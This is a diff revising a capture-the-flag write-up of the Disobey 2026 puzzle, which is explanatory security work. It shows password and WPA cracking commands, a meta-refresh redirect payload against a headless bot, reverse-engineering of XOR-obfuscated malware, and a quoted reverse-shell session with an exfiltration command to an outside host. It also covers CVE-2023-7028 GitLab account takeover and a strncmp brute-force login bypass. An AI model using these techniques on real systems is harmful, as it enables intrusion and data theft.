@@ -1,11 +1,10 @@
 # Disobey 2026
 
-
 ## Phase 0
 
 https://disobey.fi/2026/HackerPuzzle
 
-```
+```text
 The KCCP Cyber Division has identified a suspicious file linked to recent activity targeting key companies in Kouvostoliitto, including Kouvoston Makkara. We suspect a ransomware group may be involved, but their true motives remain unclear.
 
 We are calling on the cybersecurity community to help us:
@@ -24,7 +23,8 @@ Good luck. We're counting on you.
 ```
 
 The zip contains two files, both password protected:
-```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/writeup]
 └─$ zipinfo sample.zip                
 Archive:  sample.zip
@@ -32,21 +32,18 @@ Zip file size: 60204 bytes, number of entries: 2
 -rw-a--     6.3 fat   153088 Bx defN 25-Jul-28 18:10 B3589033B9C695AB1D7998FE92C5C64E3FD25D11018E45EFEAFFE513630298C6
 -rw-a--     6.3 fat        8 Bx stor 25-Jul-28 18:13 B3589033B9C695AB1D7998FE92C5C64E3FD25D11018E45EFEAFFE513630298C6.filename
 2 files, 153096 bytes uncompressed, 59660 bytes compressed:  61.0%
-
 ```
-
 
 Try to brute with rockyou:
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Desktop/writeup]
 └─$ fcrackzip -u -D -p <(zcat /usr/share/wordlists/rockyou.txt.gz) sample.zip
 
 PASSWORD FOUND!!!!: pw == infected
 ```
 
-
-```
+```bash
 ┌──(kali㉿kali)-[~/Desktop/writeup]
 └─$ unzip -P infected sample.zip
 Archive:  sample.zip
@@ -61,7 +58,7 @@ B3589033B9C695AB1D7998FE92C5C64E3FD25D11018E45EFEAFFE513630298C6.filename: ASCII
 calc.exe
 ```
 
-Basic inspection of the exe with binwalk/exiftool/ghidra doesn't give much information. 
+Basic inspection of the exe with ``binwalk``/``exiftool``/``ghidra`` doesn't give much information.
 
 Ghidra reveals that the program might be using handle ``--secret``. The binary also seems to use SHA1.
 
@@ -74,7 +71,7 @@ From ``monodis calc.exe`` we can see that the entrypoint checks the ``--secret``
 
 Pseudocode:
 
-```
+```c
 string secret = args[0].Substring("--secret=".Length);
 
 string expected = "98e85a1a7420826db467eeb65969ac5866676009";
@@ -92,7 +89,8 @@ if (hash != expected)
 The ``98e85a1a7420826db467eeb65969ac5866676009`` should be expected SHA1 hash for the secret.
 
 We can crack the hash locally with hashcat and rockyou, or just check from online services.
-```
+
+```bash
 $ hashcat -m 100 hash.txt rockyou.txt
 ...
 98e85a1a7420826db467eeb65969ac5866676009:1lovepizza
@@ -100,7 +98,8 @@ $ hashcat -m 100 hash.txt rockyou.txt
 ```
 
 So we know the program is supposed to be run with this secret:
-```
+
+```powershell
 calc.exe --secret=1lovepizza
 ```
 
@@ -108,7 +107,7 @@ At this stage someone had already uploaded it to [JoeSandbox](https://www.joesan
 
 We can connect to the server with our own IRC client like ``irssi``.
 
-```
+```irc
 /connect connect.divanodivino.xyz 6667 D1av0laSauce!
 There are 0 users and 58 invisible on 1 server(s)
 11:38 -!- 2 IRC Operators online
@@ -152,17 +151,21 @@ Seems that anon_6174 is taking commands from different anons, but not normal use
 
 ## Phase 1 - #helpdesk
 
-The topic of ``#helpdesk`` is 
+The topic of ``#helpdesk`` is:
 
-    divano divino, concierge, qual è il suo reclamo? Parla con diavoloautoma. Pwnmarola accetta i tuoi segreti
-
-Translated to English
-
-    Divano divino, concierge, what is your complaint? Speak with diavoloautoma. Pwnmarola accepts your secrets.
-
-Seems that diavoloautoma is some AI slop bot. It gives out the first flag quite easily. Also asking for plain JSON reply gives us some infromation about later stages.
-
+```text
+divano divino, concierge, qual è il suo reclamo? Parla con diavoloautoma. Pwnmarola accetta i tuoi segreti
 ```
+
+Translated to English:
+
+```text
+Divano divino, concierge, what is your complaint? Speak with diavoloautoma. Pwnmarola accepts your secrets.
+```
+
+Seems that diavoloautoma is some AI slop bot. It gives out the first flag quite easily. Also asking for plain JSON reply gives us some information about later stages.
+
+```irc
 12:07 -!- Irssi: Starting query in 80 with diavoloautoma
 12:08 <notme> !help
 12:08 <diavoloautoma> Ciao! Divano Divino automated support. How can I help you?    Please specify your request. Be concise and provide relevant details. Remember to adhere to the OPSEC guidelines outlined in the New Member Onboarding Package.
@@ -191,7 +194,7 @@ Seems that diavoloautoma is some AI slop bot. It gives out the first flag quite 
 
 Like the topic said, Pwnmarola accepts the flag:
 
-```
+```irc
 12:31 <notme> DIV{KOUVOSTO_MAKKARA_FUORI_SERVIZIO}
 12:31 <Pwnmarola> Complimenti! HelpDesk done — you may continue to Intrusion.
 12:31 <Pwnmarola> Benvenuto to the next stage! Flag submission is now open. I just invited you to the channel #intrusion.
@@ -199,35 +202,38 @@ Like the topic said, Pwnmarola accepts the flag:
 12:31 <Pwnmarola> It's dangerous to go alone, take this: hiccup. Letsgo!
 ```
 
-## Phase 1 - #intrusion
+## Phase 2 - #intrusion
 
 The topic of ``#intrusion`` was just
 
-    https://baitza.divanodivino.xyz
-
+```text
+https://baitza.divanodivino.xyz
+```
 
 The URL has HTTP basic authentication in place. Seems like many people didn't get the tip from Pwnmarola and later the topic was changed to include the credentials:
 
-```
+```irc
 13:49 -!- joohoi changed the topic of #intrusion to: https://baitza.divanodivino.xyz | letsgo - hiccup
 13:50 < notme> :O
 ```
 
-We are faced with CanaryToken API. We are able to create new CanaryTokens with our custom message using /create endpoint. 
+We are faced with CanaryToken API. We are able to create new CanaryTokens with our custom message using /create endpoint.
 
 We are provided with monitoring link for the created token. We can see that the token is always visited by the same IP address, so it seems that there is some "dashboard" listing all of the tokens and their status.
 
-After some research, https://http418infosec.com/htb-christmas-ctf-toy-workshop gave the idea that we might be able to use redirection. However, scripting was disabled and the bot didn't visit the postb.in.
+After some research, [HTB Christmas CTF – Toy Workshop](https://http418infosec.com/htb-christmas-ctf-toy-workshop) gave the idea that we might be able to use redirection. However, scripting was disabled and the bot didn't visit the postb.in.
 
-Happily the meta tag redirecton worked:
-```
+Happily the meta tag redirection worked:
+
+```json
 {
     "message":"<meta http-equiv=\"refresh\" content=\"0; url=https://www.postb.in/<RANDOM_ID>\">"
 }
 ```
 
 From the postb.in site we could see that the bot followed the redirection:
-```
+
+```bash
     host: www.postb.in
     user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.7258.5 Safari/537.36
     accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -245,7 +251,7 @@ From the postb.in site we could see that the bot followed the redirection:
 
 Decoding the digest field from b64 gives us the flag for next phase:
 
-```
+```irc
 17:09 <notme> DIV{1t-3Xp3Rt5-u53s-C4n4rY-70k3n5-ALs0}
 17:09 <Pwnmarola> Complimenti! You have completed the Intrusion phase.
 ```
@@ -254,111 +260,117 @@ Decoding the digest field from b64 gives us the flag for next phase:
 
 The topic of ``#execution`` was:
 
-    Strumenti di intrusione militare di alta qualità
+```text
+Strumenti di intrusione militare di alta qualità
+```
 
 Translated to English:
 
-    High-quality military intrusion tools
+```text
+High-quality military intrusion tools
+```
 
 We received unique CP/M binary from Pwnmarola. Please note that the following only applies to this specific binary [7C1C1707.COM](p3/7C1C1707.COM)
 
-```
+```irc
 17:09 <Pwnmarola> So you think you can hack it? Go and install this piece of custom malware on one of the latest z180 based Kouvosto Telecom secure workstations. Their CP/M 2.2 environment is wide open.
 17:09 <Pwnmarola> You can download the malware here: https://deliveryboy.divanodivino.xyz/stages/execution/7C1C1707.COM
 ```
 
 Running the binary with some crappy emulator prints Beacon id and asks for activation key:
-```
+
+```console
 Beacon id: 6452dfb27902aa16c0e5dee72e1f856a
 Activation key: 
 Njet
 ```
 
 We load the binary to Ghidra with the help of the earlier AI bot response:
-```
+
+```text
 In CP/M, a .COM file is a memory image of a program that is loaded directly into memory and executed. The standard load address for CP/M .COM files is 0100h (hexadecimal).
 ```
 
-We set the base address to 0x100 and language to Z180.
+We set the base address to ``0x100`` and language to Z180.
 The main function can be found from string references.
 It checks the user input using some xor transformation.
 
-    void main(undefined2 param_1)
+```c
+void main(undefined2 param_1)
 
-    {
-      undefined *puVar1;
-      undefined2 *puVar2;
-      undefined1 uVar3;
-      char *pcVar4;
-      undefined2 local_2;
-      byte char;
-      
-      puVar2 = &local_2;
-      pcVar4 = s_6452dfb27902aa16c0e5dee72e1f856a_ram_2472;
-      uVar3 = 0x24;
-      local_2 = param_1;
-      FUN_ram_1a67(0x36,0x35,100,0x62,0x37,0x30,0x61,0x31,99,0x65,100,0x65,0x32,0x31,0x38,0x36,0);
-      FUN_ram_1a67(uVar3,pcVar4,s_Activation_key:_ram_2493);
-      pcVar4 = s_%63s_ram_245d;
-      uVar3 = 0x24;
-      FUN_ram_1a8a(&input_key_store_4807);
-      printf(uVar3,s__ram_24a4);
-      if ((char)((ushort)pcVar4 >> 8) == '\0' && (char)pcVar4 == '\0') {
-        printf(s_Uh?_ram_24a6);
-      }
-      else {
-        char = 7;
-        remove_trailing();
-        char_store_4907 = char;
-        if (char_store_4907 == 0x20) {
-          i = 0;
-          do {
-            char = i;
-            transformed_455d = (&input_key_store_4807)[i];
-            *(byte *)((short)puVar2 + -1) = i;
-            *(byte *)((short)puVar2 + -1) = char & 1;
-            if ((char & 1) == 0) {
-              transformed_455d = transformed_455d | 0x80;
-            }
-            else {
-              transformed_455d = transformed_455d - 0x20;
-            }
-            running_xor = running_xor ^ ~transformed_455d ^ i;
-            (&result_4887)[i] = running_xor;
-            i = i + 1;
-          } while (i < 0x80);
-          for (i = 0; i < char_store_4907; i = i + 1) {
-            if ((&expected_key_455f)[i] != (&result_4887)[i]) {
-              ok_455e = '\0';
-            }
-          }
-          if (ok_455e == '\0') {
-            printf(s_Njet_ram_24ab);
-          }
-          else {
-            data_to_6k();
-            jump_to_5f00();
-          }
+{
+  undefined *puVar1;
+  undefined2 *puVar2;
+  undefined1 uVar3;
+  char *pcVar4;
+  undefined2 local_2;
+  byte char;
+  
+  puVar2 = &local_2;
+  pcVar4 = s_6452dfb27902aa16c0e5dee72e1f856a_ram_2472;
+  uVar3 = 0x24;
+  local_2 = param_1;
+  FUN_ram_1a67(0x36,0x35,100,0x62,0x37,0x30,0x61,0x31,99,0x65,100,0x65,0x32,0x31,0x38,0x36,0);
+  FUN_ram_1a67(uVar3,pcVar4,s_Activation_key:_ram_2493);
+  pcVar4 = s_%63s_ram_245d;
+  uVar3 = 0x24;
+  FUN_ram_1a8a(&input_key_store_4807);
+  printf(uVar3,s__ram_24a4);
+  if ((char)((ushort)pcVar4 >> 8) == '\0' && (char)pcVar4 == '\0') {
+    printf(s_Uh?_ram_24a6);
+  }
+  else {
+    char = 7;
+    remove_trailing();
+    char_store_4907 = char;
+    if (char_store_4907 == 0x20) {
+      i = 0;
+      do {
+        char = i;
+        transformed_455d = (&input_key_store_4807)[i];
+        *(byte *)((short)puVar2 + -1) = i;
+        *(byte *)((short)puVar2 + -1) = char & 1;
+        if ((char & 1) == 0) {
+          transformed_455d = transformed_455d | 0x80;
         }
         else {
-          uVar3 = 0x24;
-          printf();
-          puVar1 = &input_key_store_4807;
-          remove_trailing(uVar3);
-          if ((char)puVar1 == '\x1f' && (char)((ushort)puVar1 >> 8) == '\0') {
-            printf(s_Njet_CR,_Da_CRLF_ram_24b1);
-          }
+          transformed_455d = transformed_455d - 0x20;
+        }
+        running_xor = running_xor ^ ~transformed_455d ^ i;
+        (&result_4887)[i] = running_xor;
+        i = i + 1;
+      } while (i < 0x80);
+      for (i = 0; i < char_store_4907; i = i + 1) {
+        if ((&expected_key_455f)[i] != (&result_4887)[i]) {
+          ok_455e = '\0';
         }
       }
-      return;
+      if (ok_455e == '\0') {
+        printf(s_Njet_ram_24ab);
+      }
+      else {
+        data_to_6k();
+        jump_to_5f00();
+      }
     }
-
+    else {
+      uVar3 = 0x24;
+      printf();
+      puVar1 = &input_key_store_4807;
+      remove_trailing(uVar3);
+      if ((char)puVar1 == '\x1f' && (char)((ushort)puVar1 >> 8) == '\0') {
+        printf(s_Njet_CR,_Da_CRLF_ram_24b1);
+      }
+    }
+  }
+  return;
+}
+```
 
 It can be seen that it is possible to reverse the activation key from the code.
-Using [xor.py](p3/xor.py) we got
-``6239f766324888c0a9970843fe68a68a``
+Using [xor.py](p3/xor.py) we got ``6239f766324888c0a9970843fe68a68a``
 
-```
+```console
 A>7C1C1707.COM
 Beacon id: 6452dfb27902aa16c0e5dee72e1f856a
 Activation key: 6239f766324888c0a9970843fe68a68a
@@ -366,11 +378,11 @@ Activation key: 6239f766324888c0a9970843fe68a68a
 <program hangs up>
 ```
 
-So back to reversing. If the key matches, another xor is done in data_to_6k() -function 0689.
-The function XOR-decrypts an 8 KB (00 20) encrypted payload from 0x24C3 using a key at 0x4807.
-The result is stored at 0x6000. This is the 2nd stage of z180hell.
+So back to reversing. If the key matches, another xor is done in ``data_to_6k()`` -function @ ``0x0689``.
+The function XOR-decrypts an 8 KB (``00 20``) encrypted payload from ``0x24C3`` using a key at ``0x4807``.
+The result is stored at ``0x6000``. This is the 2nd stage of z180hell.
 
-```
+```c
 void data_to_6k(void)
 {
     i = 0;
@@ -386,9 +398,9 @@ void data_to_6k(void)
 }
 ```
 
-Then, function jump_to_5f00 does two memcpy's before jumping to RAM
+Then, function ``jump_to_5f00`` does two memcpy's before jumping to RAM
 
-```
+```c
 void jump_to_5f00(void)
 {
     memcpy(0x80,&input_key_store_4807,0x5276);
@@ -397,31 +409,34 @@ void jump_to_5f00(void)
 }
 ```
 
-So first, 128 (0x80) bytes are copied from &input_key_store_4807 to RAM address 0x5276.
+So first, 128 (``0x80``) bytes are copied from &input_key_store_4807 to RAM address 0x5276.
 
 *Unfortunately, this was the part I missed, even though it was clearly written in my notes.*
 
-Then, 43 (0x2B 00) bytes are copied from 0x44cb to 5f00, and the execution is moved there.
+Then, 43 (``2B 00``) bytes are copied from ``0x44cb`` to ``0x5f00``, and the execution is moved there.
 
 Disassemble results the following code:
 
-        ram:44cb 21 00 60        LD         HL,0x6000
-        ram:44ce 11 00 00        LD         DE,0x0
-        ram:44d1 01 00 20        LD         BC,0x2000
-        ram:44d4 ed b0           LDIR                                                        = F3h
-                                                                                             = C3h
-        ram:44d6 c3 00 00        JP         RST0
+```asm
+ram:44cb 21 00 60        LD         HL,0x6000
+ram:44ce 11 00 00        LD         DE,0x0
+ram:44d1 01 00 20        LD         BC,0x2000
+ram:44d4 ed b0           LDIR                                                        = F3h
+                                                                                      = C3h
+ram:44d6 c3 00 00        JP         RST0
+```
 
-
-This stub copies 8192 bytes (0x2000) from 0x6000 to 0x0000 replacing the 1st stage.
-Then, it jumps to address 0x0000, starting execution from the reset vector.
+This stub copies 8192 bytes (``0x2000``) from ``0x6000`` to ``0x0000`` replacing the 1st stage.
+Then, it jumps to address ``0x0000``, starting execution from the reset vector.
 
 Most of the people were stuck in this stage. The topic of the channel was updated to include a link to short memo:
 
-    Strumenti di intrusione militare di alta qualità! || Il miglior hacker TouchYerSpaget insegna ai novellini: https://nopaste.net/lkQfNFFJla                                         
-
+```text
+Strumenti di intrusione militare di alta qualità! || Il miglior hacker TouchYerSpaget insegna ai novellini: https://nopaste.net/lkQfNFFJla                                         
 ```
- # Ghidra for leet hackers
+
+```markdown
+# Ghidra for leet hackers
 
 * d - dissassemble at current address
 * r - reference manager
@@ -441,16 +456,15 @@ People were also struggling to find working z180 emulator, and the file was late
 
 I continued by decoding the data starting from ``24c3`` using the same pattern and extract the second stage binary [extract_stage2.py](p3/extract_stage2.py) for easier inspection and emulation.
 
-The second stage required emulating some peripherals to bypass platform validation. After the validation was passed, you were supposed to dial to the IRC server by sending CONNECT to the second UART channel.
+The second stage required emulating some peripherals to bypass platform validation. After the validation was passed, you were supposed to dial to the IRC server by sending ``CONNECT`` to the second UART channel.
 
 *As I was only running the extracted 2nd stage as separate binary, I was stuck at this stage as I missed the 3rd part of the XOR obfuscation, I wasn't able to get the flag printed out. As soon as the [writeup for this part](https://github.com/depili/blyat_strike/tree/main) was released, I ran the binary from the start and got the flag. Even though the competition was already over, I decided to proceed to the next parts.* **#oispahackerbadge**
-
 
 ## Phase 4 - #collection
 
 This stage started with [PCAP-file](p4/c276ea53a8a6f85bcea9bea041f82d5668ac6937.pcap) containing capture of WLAN traffic. We have all four EAPOL messages.
 
-```
+```console
 hcxpcapngtool c276ea53a8a6f85bcea9bea041f82d5668ac6937.pcap -o wifi.hc22000
 hcxpcapngtool 6.2.5 reading from c276ea53a8a6f85bcea9bea041f82d5668ac6937.pcap...
 
@@ -510,9 +524,9 @@ session summary
 processed cap files...................: 1
 ```
 
-Try to crack WIFI password using hashcat and rockyou once again:
+Try to crack WIFI password using ``hashcat`` and rockyou once again:
 
-```
+```bash
 $ hashcat -a 0 -m 22000 --opencl-device-types=1 wifi.hc22000 rockyou.txt
 hashcat (v6.2.5) starting
 
@@ -530,18 +544,17 @@ ef8549a7be7a2156784612acdfcfd73f:f0795976aba8:f0d5bf0fd7c3:Kouvoston Makkara:nak
 3fdcb0707bfda6591a42bb12afdecf1c:f0795976aba8:f0d5bf0fd7c3:Kouvoston Makkara:nakkimakkara007
 ```
 
-Noe we can decrypt the traffic in Wireshark:
+Now we can decrypt the traffic in Wireshark:
 
-- Edit -> Preferences 
+- Edit -> Preferences
 - Protocols → IEEE 802.11
 - Enable Decrypt 802.11 data
 - Edit decryption keys and add
-    wpa-pwd:nakkimakkara007:Kouvoston Makkara
+    ``wpa-pwd:nakkimakkara007:Kouvoston Makkara``
 
+Packet 4753 contains ``GET`` request for [client.py](p4/client.py) which can be extracted from packet 4773.
 
-Packet 4753 contains GET request for [client.py](p4/client.py) which can be extracted from packet 4773.
-
-```
+```python
 #!/usr/bin/env python3
 """
 Reverse Shell Client with very secure ROT13 Encryption
@@ -551,11 +564,11 @@ Connects back to the server and executes commands
 ```
 
 From the script we know that it is trying to connect to crust.divanodivino.xyz:443 and uses ROT13 encryption.
-Filtering by ``ip.dst == 94.237.39.92`` shows that after the client.py was fetched there are some packets to :443 with plain text data. 
+Filtering by ``ip.dst == 94.237.39.92`` shows that after the client.py was fetched there are some packets to :443 with plain text data.
 
 Following the TCP Stream (``tcp.stream eq 23``) and using ROT13 we can see that the following commands were run through the reverse shell:
 
-```
+```bash
 $whoami
 root
 
@@ -593,7 +606,7 @@ $ python3 KFahRhrk archive.zip crust.divanodivino.xyz verySecureEncryptionThisIs
 
 Before the file was sent there were 3 pieces of ICMP pings with oddly much data (22/548/6 bytes).
 
-```
+```bash
 1st packet (start):
 0000   00 00 5b 8f 16 b5 7e ac 02 07 d6 3b ba 3a 4e a8
 0010   ee a9 a0 d3 84 c5
@@ -610,7 +623,7 @@ Before the file was sent there were 3 pieces of ICMP pings with oddly much data 
 As we know from the command log the file should be 546 bytes, but this data is 548 bytes.
 It seems that the packets are prefixed with sequence number ``00 00`` - ``00 02``, so lets remove those, save the different hex streams to text and convert them to binary with xxd.
 
-```
+```bash
 $ xxd -r -p start.txt > start.bin
 $ xxd -r -p archive.txt > archive.bin
 $ xxd -r -p end.txt > end.bin
@@ -624,7 +637,7 @@ $ wc -c start.bin archive.bin end.bin
 It can be assumed that the archive.bin should contain encrypted .zip.
 Using the decrypt.py we try to guess which encryption is used.
 
-```
+```bash
 $ python3 decrypt.py
 [*] BEST SCORE: 14
 [*] BEST LABEL: rc4_pw_raw_drop0
@@ -637,23 +650,26 @@ best_guess.zip: Zip archive data, at least v2.0 to extract, compression method=d
 
 Using the known password we can just extract the flag and proceed to operations:
 
-    unzip -P veryLong123Secure456Password098ABBA best_guess.zip
-    Archive:  best_guess.zip
-    inflating: file.txt
-    extracting: flag.txt
+```bash
+$ unzip -P veryLong123Secure456Password098ABBA best_guess.zip
+Archive:  best_guess.zip
+inflating: file.txt
+extracting: flag.txt
+```
 
-    
 ## Phase 5 - #operations
 
 The topic for ``#operations`` is:
 
-    welcome to the inner circle. dig in, leave traces of genius: https://Diavola:S0urDoughShellz@gitlab.divanodivino.xyz/ — ping TouchYerSpaget for creds.
+```text
+welcome to the inner circle. dig in, leave traces of genius: https://Diavola:S0urDoughShellz@gitlab.divanodivino.xyz/ — ping TouchYerSpaget for creds.
+```
 
 The URL contains On-premises Gitlab login page.
 
 As ``/ping`` or messaging doesn't give anything, lets ``/whois TouchYerSpaget``:
 
-```
+```irc
 19:21 -!- TouchYerSpaget [~u@divanodivino.xyz]
 19:21 -!- ircname : yo. going dark. feds are circling. checkin' proton.me every now and then — you know where. stay safe.
 19:21 -!- channels : @#operations
@@ -662,19 +678,20 @@ As ``/ping`` or messaging doesn't give anything, lets ``/whois TouchYerSpaget``:
 19:21 -!- away : User is currently disconnected 19:21 -!- End of WHOIS
 ```
 
-From that information we might guess that he's using Proton mail. 
+From that information we might guess that he's using Proton mail.
 We can confirm this by sending email to TouchYerSpaget@proton.me.
 There is no reply, but it seems that this mailbox really exists.
 
 Getting information about the Gitlab version wasn't easy, but finally the suitable exploit was [CVE-2023-7028](https://nvd.nist.gov/vuln/detail/cve-2023-7028), [Account Takeover via Password Reset without user interactions](https://hackerone.com/reports/2293343).
 
-So we send reset password request with Postman using the expected email of TouchYerSpaget together with ours to receive the Reset Password email succesfully.
+So we send reset password request with Postman using the expected email of TouchYerSpaget together with ours to receive the Reset Password email successfully.
 
-The Gitlab contains three repos. Two of them contained the source code for earlier stages (p0 [chat](p0/touch.cs) and p3 blyat_strike).
+The Gitlab contains three repos. Two of them contained the source code for earlier stages (p0 [chat](p0/touch.cs) and p3 [blyat_strike](https://github.com/depili/blyat_strike/tree/main)).
 The third repository [sliceshare](p5/sliceshare-main.zip) was the interesting one.
 
 README.md:
-```
+
+```markdown
 # Sliceshare
 
 ## What?
@@ -696,7 +713,7 @@ you'll need to ensure you're only using the most recent state-of-the-art
 software and libraries as well.
 ```
 
-```
+```bash
 $ ls
 README.md  crontab  password.txt  private.pem  prog.bin  public.pem  server_nftables.conf
 ```
@@ -705,13 +722,14 @@ So we have the server binary and local password for testing, but of course the s
 
 We also have private and public key pair.
 
-crontab and server_nftables.conf contain basic information about the server setup and that there is rate-limiting and you can get banned for 5 min.
+``crontab`` and ``server_nftables.conf`` contain basic information about the server setup and that there is rate-limiting and you can get banned for 5 min.
 
 So back to reversing, and after some Ghidra-magic and testing with the binary, we know that this is somekind of server with few commands. It also expects that the messages are signed on both ends and to contain correct CRC16.
 Signature is Ed25519ctx with context-string: "A protocol defined context string".
 
-We can use terminal.py for the client side and we receive the welcome message:
-```
+We can use [terminal.py](p5/terminal.py) for the client side and we receive the welcome message:
+
+```console
 Welcome, client number 4 / 255
 1 - Login
 2 - List files
@@ -720,17 +738,16 @@ Welcome, client number 4 / 255
 5 - Disconnect
 ```
 
-The file operations are only available after succesful login.
+The file operations are only available after successful login.
 As we know the password, we are able to login locally but this doesn't work on the remote server.
 
-From the login function we know that the only accepted user is "admin" and that the password is read from the file. 
+From the login function we know that the only accepted user is ``admin`` and that the password is read from the file.
 
 With further investigation we notice that even though the password check uses ``strncmp``, it uses the length supplied by the client:
 
-```
+```c
 user_ok = strncmp((char *)(pw_fd + 2),(char *)(rcvd + 1),(ulong)*rcvd);
 ```
 
-So we implement recover_password() functionality in the terminal.py and brute-force all printable ascii characters.
-With succesful login we are able to download the flag.txt from the server and finish the challenge.
-
+So we implement recover_password() functionality in the [terminal.py](p5/terminal.py) and brute-force all printable ascii characters.
+With successful login we are able to download the flag.txt from the server and finish the challenge.
